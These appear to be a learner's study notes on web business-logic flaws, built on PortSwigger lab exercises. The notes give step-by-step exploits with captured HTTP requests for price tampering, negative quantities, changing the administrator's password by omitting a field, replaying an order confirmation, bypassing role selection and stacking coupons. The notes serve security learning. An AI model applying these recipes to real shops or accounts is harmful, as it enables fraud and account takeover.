## Excessive trust in client-side controls

1. **Validate User Input**
   
   EX:
   
   if you buy a thing from site and didn't validate the price of this product 
   
   then you can use burp proxy and change the `price` parameter of this product before you buying it
   
   ```log
   POST /cart HTTP/2
   Host: 0afc00b60407046780f3a4ce003a0023.web-security-academy.net
   Cookie: session=GSjb9epPet3jAPWlTIQWXL6bCNxLm6yC
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 49
   Origin: https://0afc00b60407046780f3a4ce003a0023.web-security-academy.net
   Referer: https://0afc00b60407046780f3a4ce003a0023.web-security-academy.net/product?productId=1
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   
   productId=1&redir=PRODUCT&quantity=1&price=133700
   ```

2. **Failing to handle unconventional input**
   
   By observing the application's response, you should try and answer the following questions:
   
   - Are there any limits that are imposed on the data?
   
   - What happens when you reach those limits?
   
   - Is any transformation or normalization being performed on your input?

If you buy a thing from site and didn't validate the `type` of `quantity` Number of this product then you can use burp proxy and change the `quantity` parameter of this product before you buying it and when you Press `Place Order`  to buy this order this error massage is showen `Cart total price cannot be less than zero` because the `Total price : $-1337.00` is `Negative Number` then add any product normaly in the list to make the `Total price : $-1337.00 + 500 + 500 + 300 + 30 = $7.00` Then You Can buy this order with \$7

```log
POST /cart HTTP/2
Host: 0a66000c030bb2e780abf9a6003c005b.web-security-academy.net
Cookie: session=cHRDQ59zMG0cODe3LsUoSpu4eWMxLick
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0a66000c030bb2e780abf9a6003c005b.web-security-academy.net
Referer: https://0a66000c030bb2e780abf9a6003c005b.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailer

productId=1&redir=PRODUCT&quantity=1
```

   EX2 Low-level logic flaw:

If you buy a thing from site and didn't validate the `limits` of `quantity` Number of this product then you can use burp intruder and set the `NULL Payloads` and start the attack and refresh the page that shows you the total price that should be increasing and then after a certain number of payloads it turns into a negative number.

   <u>**HINT**</u> :

    When you entered big input and the website cut his input then remember BOF

3. Inconsistent security controls
   
   If business rules and security measures are not applied consistently throughout the application, this can lead to potentially dangerous loopholes that may be exploited by an attacker. 
   
   After Login ther are a function make user to update his email and the admin page can't access with normal user the you can update his email to admin like this
   
   from `attacker@company.com` to `attacker@admin.com`
   
   ```log
   POST /my-account/change-email HTTP/2
   Host: 0a9e003b031a21c3803bb2ce00510090.web-security-academy.net
   Cookie: session=QaqrNtS9kAe2KkKjcBjpsj2KxfuXCnls
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 71
   Origin: https://0a9e003b031a21c3803bb2ce00510090.web-security-academy.com
   Referer: https://0a9e003b031a21c3803bb2ce00510090.web-security-academy.net/my-account
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: documen
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   
   email=attacker@admin.com&csrf=bA1jgcPp3snEycQvT0WKOhVCqijSHBT
   ```

4. Users won't always supply mandatory input (Weak isolation on dual-use endpoint)
   
   When probing for logic flaws, you should try removing each parameter in turn and observing what effect this has on the response. 
   
   You should make sure to:
   
   - Only remove one parameter at a time to ensure all relevant code paths are reached.
   
   - Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.
   
   - Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.
   
   This applies to both `URL` and `POST` parameters, but don't forget to check the `cookies` too. This simple process can reveal some bizarre application behavior that may be exploitable.
   
    EX:
   
   After I Login ther are a page `/my-account` in this page you can change you `password` and `Email` when you change your password if you remove the 
   
   `current-password` parameter entirely, you are able to successfully change your password without providing your current one.Observe that the user whose password is changed is determined by the username parameter. Set `username=administrator` and send the request again.
   
   Log out and you can now successfully log in as the administrator using the password you just set.
   
   ```log
   POST /my-account/change-password HTTP/2
   Host: 0a1f005304473668882d0f18009f00ee.web-security-academy.net
   Cookie: session=6FQ9BN01BAo49F9Y03FSn80DYG7TdScr
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 125
   Origin: https://0a1f005304473668882d0f18009f00ee.web-security-academy.net
   Referer: https://0a1f005304473668882d0f18009f00ee.web-security-academy.net/my-account?id=wiener
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   
   csrf=IlU7sHRaW6YtBr9XIpZod0frMykY9xwt&username=administrator&new-password-1=admin&new-password-2=admin
   ```

5. Insufficient workflow validation
   
   Making assumptions about the sequence of events can lead to a wide range of issues even within the same workflow or functionality. Using tools like `Burp Proxy` and `Repeater`, once an attacker has seen a request, they can replay it at will and use forced browsing to perform any interactions with the server in any order they want. This allows them to complete different actions while the application is in an unexpected state. 
   
   EX:
   
   With Burp running, log in and buy any item that you can afford with your store
   
   credit. Study the proxy history. Observe that when you place an order, the
   
   `POST /cart/checkout` request redirects you to an order confirmation page. Send 
   
   `GET /cart/order-confirmation?order-confirmation=true` to Burp Repeater. 
   
    Add the any item to You basket that you can't buy it `ex:if you have a $100 and you add the item with price $1000`. In Burp Repeater, resend the order confirmation request. Observe that the order is completed without the cost being deducted from your store credit.
   
   ```log
   GET /cart/order-confirmation?order-confirmed=true HTTP/2
   Host: 0afc0095036b49978012c1aa00ae00b8.web-security-academy.net
   Cookie: session=l3E8DNk0ahJfXgBzp2GNhoDSr0R590dm
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Referer: https://0afc0095036b49978012c1aa00ae00b8.web-security-academy.net/cart
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   ```

6. Authentication bypass via flawed state machine 
   
   With Burp running, complete the login process and notice that you need to select your role before you are taken to the home page.  Use the content discovery tool to identify the /admin path.  Try browsing to /admin directly from the role selection page and observe that this doesn't work.  Log out and then go back to the login page. In Burp, turn on proxy intercept then log in.  Forward the `POST /login` request. The next request is `GET /role-selector`. Drop this request and then browse to the lab's home page. Observe that your role has defaulted to the `administrator `role and you have access to the admin panel. 
   
   

7. Domain-specific flaws
   
   The discounting functionality of online shops is a classic attack surface when hunting for logic flaws. This can be a potential gold mine for an attacker, with all kinds of basic logic flaws occurring in the way discounts are applied. 
   
   EX:
   
   Try applying the codes more than once. Notice that if you enter the same code twice in a row, it is rejected because the coupon has already been applied. However, if you alternate between the two codes, you can bypass this control. 
